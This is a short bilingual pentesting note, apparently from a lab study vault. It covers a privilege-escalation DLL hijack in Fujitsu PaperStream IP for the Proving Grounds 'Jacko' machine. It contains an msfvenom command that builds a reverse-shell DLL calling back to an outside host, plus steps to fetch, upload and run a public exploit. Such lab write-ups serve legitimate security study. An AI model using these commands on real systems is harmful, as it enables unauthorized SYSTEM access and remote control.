## DESCRIPTION

A Dll Hijack vulnerability was discovered in version 1.42.0.5685 (Service Update 7) of the Fujitsu “PaperStream IP (TWAIN) software package. The FJTWSVIC.exe service running with SYSTEM privilege, processes unauthenticated messages received over the FjtwMkic_Fjicube_32 named pipe. 

Para enumerar la versión:
![[Pasted image 20230320190615.png]]

#### Mas información
* https://pentesting.zeyu2001.com/proving-grounds/get-to-work/jacko

## EXPLOITATION

1. Descargamos el exploit:

```
searchsploit -m windows/local/49382.ps1
```
2. Creamos nuestra DLL con la reverse shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=9999 -f dll > shell.dll
```

**!!NOTA IMPORTANTE!!** 
	Cuidado si al enumerar el programa se encuetra en `Program Files (x86)` entonces tienes que crear la DLL de 32 bits

![[Pasted image 20230320190626.png]]

3. Modificamos el exploit:

![[Pasted image 20230320190912.png]]

4. Subimos el exploit a la máquina victima [[TRANSFERRING FILES]]

5. Ejecutamos el exploit DESDE UN DIRECTORIO CON PERMISOS DE ESCRITURA

![[Pasted image 20230320190803.png]]

**!!NOTA IMPORTANTE!!** 
	Necesitamos un directorio con permisos de escritura

## MACHINES

* Hack The Box: 
* Pg Practoce: Jacko
